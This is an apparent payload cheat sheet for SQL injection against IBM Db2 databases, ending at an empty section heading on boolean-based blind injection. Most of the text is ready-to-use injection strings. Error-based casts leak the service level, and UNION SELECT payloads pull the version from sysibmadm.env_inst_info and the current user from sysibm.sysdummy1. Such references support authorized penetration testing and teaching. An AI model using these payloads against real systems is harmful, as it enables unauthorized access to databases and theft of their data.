# IBM Db2

## Error-based
Cast to invalid type to leak data in error.

To retrieve version (service_level):
' AND 1=CAST(service_level AS INT) --

## Union query-based
Append UNION to extract.

To retrieve version:
' UNION SELECT NULL, service_level FROM sysibmadm.env_inst_info --

To retrieve user:
' UNION SELECT NULL, user FROM sysibm.sysdummy1 --

## Boolean-based blind
